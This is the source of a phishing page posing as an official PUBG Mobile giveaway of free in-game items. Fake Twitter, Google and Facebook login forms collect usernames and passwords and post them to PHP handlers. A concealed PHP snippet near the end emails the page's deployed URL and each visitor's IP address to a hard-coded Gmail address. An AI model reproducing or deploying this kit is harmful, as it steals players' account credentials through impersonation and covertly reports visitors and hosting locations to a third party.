<!DOCTYPE html>
<html>
<head>
<title>PUBG Mobile - Official PUBG on mobile</title>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta property="og:description" content="For a limited time you can buy all the weapon finish, plane finish, and more item that you wanted just for free. Reward and bonus will be given to players who have submitted the data."/>
<meta property="og:image" content="img/thumbnail.png"/>
<meta property="og:image:width" content="540"/>
<meta property="og:image:height" content="282"/>
<link rel="icon" type="img/png" href="img/thumbnail.png" sizes="32x32"/>
<link rel="stylesheet" type="text/css" href="css/style.css"/>
<link rel="stylesheet" type="text/css" href="css/mystyle.css"/>
<link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>

</head>
<body>


<style type="text/css">
	#login fieldset:not(:first-of-type) {
		display: none;
	}
</style>


<div class="sticky">
<a href="/"><img src="https://midas.gtimg.cn/overseaspay/images/1450015065/mo_ft_logo_igame.png"></a>
</div>
<div class="slider-container">
<div class="slider">
<img src="img/wts.jpeg" style="width:100%;">
</div>
<div class="slider">
<img src="img/s1.jpg" style="width:100%;">
</div>
<div class="slider">
<img src="img/s2.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/s3.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/s4.jpg" style="width:100%">
</div>
<div class="slider">
<img src="img/s5.jpg" style="width:100%">
</div>
</div>


<div class="gallery-container">

<!--- TWITTER LOGIN --->
<div id="twitter">
<div class="twitter-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-twitter">
<center>
<img width="30" src="img/login-popup/twitter.png">
</center>
</div>
</br>
</br>
<center>
<h5>Login to Twitter</h5>
</center>
<form class="formku" action="twitter.php" method="post">
<input type="text" name="etw" placeholder="Phone, email, or username" autocomplete="off" autocapitalize="off" required></br>
<input type="password" name="ptw" placeholder="Password" autocomplete="off" autocapitalize="off" required></br>
</br>
</br>
<center>
<button type="submit" class="btn-login-twitter"><b>Login</b></button>
</center>
</form>
</div>
</div>
<!--- GOOGLE PLAY LOGIN --->
<div id="gp">
<div class="gp-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-gp">
<center>
<img width="80" src="img/login-popup/google.png">
</center>
</div>
</br>
<form class="formku" id="login" novalidate action="google.php" method="post">
<fieldset>
<center>
<h5>Sign in</h5>
</br>
<b font-size="100" style="color:black;">with your Google Account</b>
</center>
<input type="text" name="gmail" placeholder="Email or phone" autocomplete="off" autocapitalize="off" required></br>
<button type="button" class="btn-register-gp"><b>Create account</b></button>
<button type="button" class="next btn-login-gp"><b>Next</b></button>
</fieldset>

<fieldset>
<center>
<i style="color: black;" class="fa fa-user-circle fa-3x"></i>
</br>
</br>
<h5>Welcome</h5>
</br>
<b font-size="100" style="color:black;">enter your password below</b>
</center>
<input type="password" name="gpass" placeholder="Enter your password" autocomplete="off" autocapitalize="off" required></br>
<button type="button" class="previous btn-register-gp"><b>Previous</b></button>
<button type="submit" class="btn-login-gp"><b>Sign in</b></button>
</fieldset>
</form>
</div>
</div>
<!--- FB LOGIN --->
<div id="fb">
<div class="fb-login">
<a href="#" class="close" title="Close">&times;</a>
<div class="nav-fb">
<center>
<img width="100" src="img/login-popup/fb.png">
</center>
</div>
</br>
<form class="formku" action="facebook.php" method="post">
<p class="mylabel">Phone or email:</p>
<input type="text" name="efb" placeholder="" autocomplete="off" autocapitalize="off" required></br>
<p class="mylabel">Password:</p>
<input type="password" name="pfb" placeholder="" autocomplete="off" autocapitalize="off"></br>
</br>
</br>
<center>
<button type="submit" class="btn-login-fb"><b>Log In</b></button>
</center>
</br>
</br>
<div class="divider">
<span>or</span>
</div>
</br>
</br>
<center>
<button class="btn-register-fb">Create a New Account</button>
</center>
</form>
</div>
</div>
<!--- /FB LOGIN --->
<button onclick="location.href='#twitter';" class="twitter"><i style="float:left;" class="fa fa-twitter"></i>Twitter</button>
</br>
</br>
<button onclick="location.href='#fb';" class="fb"><i style="float:left;" class="fa fa-facebook-square"></i>Facebook</button>
</br>
</br>
<button onclick="location.href='#gp';" class="playgame"><i style="float:left;" class="fa fa-google-plus"></i>Google Play Games</button>
</div>


<div class="notification-container">
<div class="button">
<a href="">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/googlePlay2.png"></a>
<a href="">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/download/appstore2.png"></a>
</div>
</div>


<div class="footer">
<center>
<img style="margin-right:5px" width="30" src="img/pubg.png">
<img width="80" src="img/tencent.png">
</center>
</div>
<?php 
@ini_set('output_buffering', 0); @ini_set('display_errors', 0);
set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type:
text/html; charset=UTF-8'); $tujuanmail = 'dendisaimam5@gmail.com'; $x_path
= "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " .
$_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail,
"RaBiitch", $pesan_alert, "[ " .
$_SERVER['REMOTE_ADDR'] . " ]"); ?>
<script type="text/javascript">
var slideIndex = 0;
showSlides();
function showSlides() {
    var i;
    var slides = document.getElementsByClassName("slider");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slideIndex++;
    if (slideIndex > slides.length) {slideIndex = 1} 
    slides[slideIndex-1].style.display = "block"; 
    setTimeout(showSlides, 2500);
}
</script>

<script type="text/javascript">
$(document).ready(function(){
	var current = 1,current_step,next_step,steps;
	steps = $("fieldset").length;
	$(".next").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().next();
		next_step.show();
		current_step.hide();
		setProgressBar(++current);
	});
	$(".previous").click(function(){
		current_step = $(this).parent();
		next_step = $(this).parent().prev();
		next_step.show();
		current_step.hide();
		setProgressBar(--current);
	});
	setProgressBar(current);
	// Change progress bar action
	function setProgressBar(curStep){
		var percent = parseFloat(100 / steps) * curStep;
		percent = percent.toFixed();
		$(".progress-bar")
			.css("width",percent+"%")
			.html(percent+"%");		
	}
});
</script>


</body>

</html>
    
    
    
    
    
    